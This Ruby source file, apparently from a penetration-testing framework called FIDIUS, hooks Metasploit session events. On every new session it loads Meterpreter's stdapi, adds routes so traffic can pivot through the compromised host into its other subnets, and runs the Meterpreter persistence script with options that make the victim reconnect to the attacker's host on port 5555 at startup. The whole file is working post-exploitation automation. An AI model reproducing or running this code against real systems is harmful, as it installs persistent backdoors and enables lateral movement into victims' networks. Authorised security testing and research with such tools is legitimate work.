module FIDIUS

module Session

  class MsfSessionEvent
    include ::Msf::SessionEvent

    def on_session_open(session)
      puts("on_session_open #{session}")
      FIDIUS::Session::session_action session
    end

    def on_session_close(session, reason='')
      puts("on_session_close #{session}")
    end

    def on_session_command(session, command)
      puts("on_session_command #{session} #{command}")
    end
  end

  def self.session_action session
    begin
      session.load_stdapi
      add_route_to_session session
      install_meterpreter session
    rescue ::Exception
      puts "problem in session_action: #{$!} #{$!.backtrace}"
    end
  end

  def self.install_meterpreter session
    script_path = Msf::Sessions::Meterpreter.find_script_path("persistence")
    rhost = session.exploit_datastore["RHOST"]
    rhost = (rhost != nil and !rhost.empty?) ? rhost : session.target_host
    lhost = Rex::Socket.source_address((rhost != nil and !rhost.empty?) ? rhost : "1.2.3.4");
    args = "-S -i 5 -p 5555 -r #{lhost}"
    puts "run: #{script_path} #{args}"
    session.execute_file(script_path, args)
  end

  def self.add_route_to_session session
    sb = Rex::Socket::SwitchBoard.instance
    session.net.config.each_route do |route|
      # Remove multicast and loopback interfaces
      next if route.subnet =~ /^(224\.|127\.)/
      next if route.subnet == '0.0.0.0'
      next if route.netmask == '255.255.255.255'
      next if (IPAddr.new "#{route.subnet}/#{route.netmask}").include? IPAddr.new session.target_host
      unless sb.route_exists?(route.subnet, route.netmask)
        puts "AutoAddRoute: Routing new subnet #{route.subnet}/#{route.netmask} through session #{session.sid}"
        sb.add_route(route.subnet, route.netmask, session)
      end
    end
  end

end end
